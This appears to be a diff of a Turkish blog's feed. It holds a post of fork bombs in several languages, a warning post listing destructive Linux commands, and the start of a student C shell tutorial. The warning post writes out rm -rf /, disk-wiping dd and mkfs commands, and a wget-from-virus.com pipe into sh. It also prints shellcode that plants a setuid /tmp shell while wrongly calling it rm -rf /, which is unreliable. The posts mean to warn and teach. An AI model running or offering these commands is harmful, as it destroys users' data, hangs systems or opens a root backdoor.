+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;:s
+start &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; %0
+goto s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Perl&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;n&quot;&gt;perl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;fork while fork&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Pyhton&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;C&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Javascript&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+     &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+     &lt;span class=&quot;nx&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;documentElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outerHTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;documentElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Etkisiz Hale Getirme&lt;/h2&gt;
+
+&lt;p&gt;Yapıları yüzünden fork bombaları çalışmaya başlayınca durdurması zordur. Eğer şanslıysanız PID’ler bitmeden durdurabilirsiniz. Örnek olarak bash scripti alalım:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bomb&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    bomb &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; bomb &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+bomb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Yukardaki betik öz yineli şekilde kendi kopyasını üretiyor ve ampersan operatöründen dolayı bunu arka planda yapıyor. Eğer prosesin adını biliyorsak önce dondurup sonra da bütün çocuk ve ebeveyn prosesleri öldürürüz yani:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;killall -STOP prosesAdi
+killall -KILL prosesAdi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Eğer boş PID kalmamışsa bombayı durdurmak için en az bir shell açık olmalıdır. Unix tabanlı sistemlerde her prosesin bir PIDsi vardır. Ama bu sınırlı bir rakamdır. Fork bombası PIDleri doldurursa onu durdurmak içim bir shell açamazsınız daha doğrusu yeni bir proses oluşturamazsınız. Bu durumda en az bir shell açık olmalıdır.
+kaynak:wikipedia&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Ölümcül Linux Komutları</title>
+   <link href="http://mhmtbsl.net/2013/05/02/olumcul-linux-komutlari/"/>
+   <updated>2013-05-02T16:55:00+03:00</updated>
+   <id>http://mhmtbsl.net/2013/05/02/olumcul-linux-komutlari</id>
+   <content type="html">&lt;p&gt;Bilindiği üzere linux çok güçlü bir komut kümesine sahip. Tabii ki büyük güç yanında büyük bir sorumlulukta getiriyor.(bknz. Spiderman)&lt;br&gt;
+Ne yaptığınızdan emin değilseniz kullanmamanız gereken komutlar olsun ya da çok kullandığınız bir komutun yanlış kullanımı olsun bunlar
+sisteminize büyük zarar verebilir. Komut satırı kullanma aşkıyla internette gördüğünüz her komutu direk kopyala yapıştır yaparsanız
+sisteminiz yine göçebilir.  Şimdi biraz bu &amp;quot;ölümcül&amp;quot; komutlardan bahsedelim.&lt;br&gt;
+&amp;lt;!--more--&amp;gt;&lt;/p&gt;
+
+&lt;h2&gt;rm -rf /&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;rm&lt;/code&gt; komutunu genellikle çok fazla kullanırız. Mahsum bir dosya/dizin silmeye yarayan komut. Ama yukardaki argümanlar &lt;code&gt;rm&lt;/code&gt;&amp;#39;nin
+adeta bir canavara dönüşmesini sağlıyor. Sisteminizde ne var ne yok herşeyi siliyor.( Buna harddiskiniz ve o anda bağlı flashdisklerde dahil )
+Komutu incelersek:&lt;br&gt;
+&lt;code&gt;rm&lt;/code&gt;  =&amp;gt; silme işini yapıyor.&lt;br&gt;
+&lt;code&gt;-rf&lt;/code&gt; =&amp;gt; &lt;code&gt;rm&lt;/code&gt;&amp;#39;nin öz yineli bir şekilde çalışmasını ve hiç bir uyarı vermeden dizinler ve dizinlerin içindeki dizin ve dosyaları silmesini sağlıyor.&lt;br&gt;
+&lt;code&gt;/&lt;/code&gt;   =&amp;gt; silmeye kök diziden başlanacağını belirtiyor.&lt;br&gt;
+Bu komutu yazıp enter&amp;#39;e basarsanız bütün bilgilerinizin silinmesini neden olursunuz.&lt;br&gt;
+&lt;strong&gt;rm -rf ~&lt;/strong&gt; bu komut ise benzer şekilde ev dizininizin silinmesine neden olur.&lt;br&gt;
+Sonuç: &lt;code&gt;rm&lt;/code&gt; komutunu kullanırken dikkatli olmak lazım.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+release */
+= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
+“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
+“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
+“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
+“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
+“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
+“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
+“cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;”;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Yukardaki gibi herhangi bir acayip kodu internete bir yerde görüp ne işe yarıyor diye de olsa makinanızda çalıştırmayın.&lt;br&gt;
+Neden mi? Çünkü yukardaki kod &lt;strong&gt;rm -rf /&lt;/strong&gt; in HEX halidir. Yine sisteminize elveda diyebilirsiniz.&lt;/p&gt;
+
+&lt;h2&gt;:(){ :|: &amp;amp; };:&lt;/h2&gt;
+
+&lt;p&gt;Yukardaki komuta baktığınızda ilk başta bir çeşit &lt;code&gt;smiley&lt;/code&gt; kombosu olarak görebilirsiniz. Ama bu bir fonksiyon hemde &lt;code&gt;bash&lt;/code&gt;
+fonksiyonudur. Bu haliyle anlaşılması biraz zor, birde bu haline bakalım:
+&lt;code&gt;bash
+    :() {
+        :|:&amp;amp;
+    };
+    :
+&lt;/code&gt;
+Şimdi biraz daha açık şekilde gözküyor. &lt;code&gt;:&lt;/code&gt; fonksiyon ismi(fonksiyon isimleri &lt;code&gt;bash&lt;/code&gt;te böyle yazılabiliyor). Bu fonksiyon sürekli
+kendisinin bir kopyasını üretiyor. Belleğinizi ve CPU&amp;#39;nuzu doldurup makinanızın donmasını ve ya kitlenmesini sağlıyor.&lt;br&gt;
+&lt;code&gt;fork bomb&lt;/code&gt; denilen bu tür fonksiyonlar her dilde yazılabilir. Tipik DOS(Denial of Service) ataklarıdır.&lt;br&gt;
+Ayrıntılı bilgi için:&lt;a href=&quot;http://en.wikipedia.org/wiki/Fork_bomb&quot;&gt;Fork Bombaları&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;mkfs.ext4 /dev/sda1&lt;/h2&gt;
+
+&lt;p&gt;Bu komutumuzda windows işletim sistemindeki  &lt;code&gt;format c:\&lt;/code&gt; komutu benzeri. Belirtilen (burada &lt;code&gt;/dev/sda1&lt;/code&gt; olan) harddisk bölümünü formatlıyor.&lt;br&gt;
+&lt;code&gt;mkfs.ext4&lt;/code&gt; =&amp;gt; &lt;code&gt;ext4&lt;/code&gt; dosya sistemine sahip bir bölüm oluşturur.&lt;br&gt;
+&lt;code&gt;/dev/sda1&lt;/code&gt;  =&amp;gt;  hedef harddisk bölümü.  &lt;/p&gt;
+
+&lt;h2&gt;[program] &amp;gt; /dev/sda&lt;/h2&gt;
+
+&lt;p&gt;Bu komutumuz ise herhangi bir programın çıktısını direk olarak harddisk bölümüne yazar.&lt;br&gt;
+Burada &lt;code&gt;&amp;gt;&lt;/code&gt; karakteri programın çıktısını &lt;code&gt;dev/sda&lt;/code&gt; ya göndererek oradaki bilgilerin üzerine yazmasını sağlar.&lt;/p&gt;
+
+&lt;h2&gt;dd if=/dev/random of=/dev/sda&lt;/h2&gt;
+
+&lt;p&gt;Yine yukardaki komuta benzer olarak bu komutta harddiskin verilen bölümüne yazma yapar.&lt;br&gt;
+&lt;code&gt;dd&lt;/code&gt; =&amp;gt; kopyalama işlemini gerçekleştirir.&lt;br&gt;
+&lt;code&gt;if=/dev/random&lt;/code&gt; =&amp;gt; kaynak olarak &lt;code&gt;/dev/random(rastgele veriler)&lt;/code&gt; al.&lt;br&gt;
+&lt;code&gt;of=/dev/sda&lt;/code&gt;    =&amp;gt; hedef olarak &lt;code&gt;/dev/sda&lt;/code&gt; al.  &lt;/p&gt;
+
+&lt;h2&gt;mv ~ /dev/null&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;/dev/null&lt;/code&gt; linux işletim sisteminin tabir-i caizse kara deliğidir. Ne atarsanız yutup yok eder.&lt;br&gt;
+&lt;code&gt;mv&lt;/code&gt; =&amp;gt; taşıma işlemini yapam komut&lt;br&gt;
+&lt;code&gt;~&lt;/code&gt;  =&amp;gt; ev dizini&lt;br&gt;
+&lt;code&gt;/dev/null&lt;/code&gt; =&amp;gt; taşınacak yer&lt;br&gt;
+Yani ev dizinin deki bütün dosyaları alıp götürüp kara deliğe atıyorsunuz.  &lt;/p&gt;
+
+&lt;h2&gt;wget http://virus.com/virusludosya -O – | sh&lt;/h2&gt;
+
+&lt;p&gt;Yukardaki komut ise bir web sitesinden bir program indirip direk çalıştırıyor. Çok tehlikeli bir yaklaşım. Kesinlikle güvenmediğiniz ve ya
+ne olduğundan emin olmadığınız dosyalar üzerinde denemeyin.&lt;br&gt;
+&lt;code&gt;wget&lt;/code&gt; =&amp;gt; dosya indirme komutu&lt;br&gt;
+&lt;code&gt;http://virus.com/virusludosya -O -&lt;/code&gt; =&amp;gt; indirilicek dosya&lt;br&gt;
+&lt;code&gt;| sh&lt;/code&gt;  =&amp;gt; çalıştıracak program  &lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/&quot;&gt;kaynak&lt;/a&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Basit Bir Shell - C</title>
+   <link href="http://mhmtbsl.net/2013/04/30/basit-bir-kabuk-ornegi-c/"/>
+   <updated>2013-04-30T18:01:00+03:00</updated>
+   <id>http://mhmtbsl.net/2013/04/30/basit-bir-kabuk-ornegi-c</id>
+   <content type="html">&lt;p&gt;İşletim Sistemleri dersinde C programlama dilinde basit bir &lt;strong&gt;kabuk(shell)&lt;/strong&gt; kodlanmamız istendi. Hocam( &lt;a href=&quot;http://roktas.me/&quot;&gt;Recia Oktaş&lt;/a&gt; ) yardımıyla basit bir kabuk oluşturdum. Burada size dilim döndüğünce nasıl yaptığımı anlatacağım.
+&amp;lt;!-- more --&amp;gt;&lt;/p&gt;
+
+&lt;h4&gt;fork() - exec()&lt;/h4&gt;
+
+&lt;p&gt;Ödevin asıl amacı fork-exec mekanizmasını kavramamızdı. Kodları anlayabilmeniz için fork-exec mekanizmasının nasıl çalıştığını bilmeniz gerekiyor. Kabaca &lt;code&gt;fork()&lt;/code&gt;, çalışan prosesin bir kopyasını oluştur ve &lt;code&gt;fork()&lt;/code&gt;&amp;#39;un bulunduğu satırdan sonra iki farklı proses çalışmaya başlar. &lt;code&gt;exec()&lt;/code&gt; ise kopyalanan prosese başka bir programı yerleştirmeye yarar.&lt;/p&gt;
+
+&lt;p&gt;Bu bilgiden sonra kodlamaya dönebiliriz. Öncelikle yazacağımız fonksiyonları tanıyalım.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;argv_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;command_cd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;command_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;command_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;find_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;argv_free()&lt;/code&gt; fonksiyonu adından da anlaşılacağı gibi &lt;code&gt;malloc()&lt;/code&gt; ile ayırdığımız bellek alanlarını boşaltıyor. &lt;code&gt;run()&lt;/code&gt; fonksiyonu çalışması istenilen programı çalıştırıyor. &lt;code&gt;parse()&lt;/code&gt; ise string şeklinde aldığımız komut ve argümanlarını istediğimiz biçime dönüştürmemizi sağlıyor. &lt;code&gt;command_cd()&lt;/code&gt; ise &lt;code&gt;cd&lt;/code&gt; komutunun gerçeklemesi. &lt;code&gt;command_exit()&lt;/code&gt; ise programın çıkacağı durumlarda devreye giriyor. &lt;code&gt;find_command()&lt;/code&gt; ise &lt;code&gt;exec()&lt;/code&gt; ile çalıştıramadığımız &lt;code&gt;built-in&lt;/code&gt; komutları oluşturduğumuz tabloda arayıp buluyor ve döndürüyor.&lt;/p&gt;
+
+&lt;p&gt;Artık tek tek fonksiyonları inceleyebiliriz.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;argv_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;arguments&lt;/code&gt; adında bir dizinin( komut ve argumanları tuttuğumuz dizi ) elemanlarının bellekte tuttuğu alanları boşaltıyor.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                            &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+                            &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execvp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                            &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;execv&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                            &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;fork&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;waitpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;waitpid&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
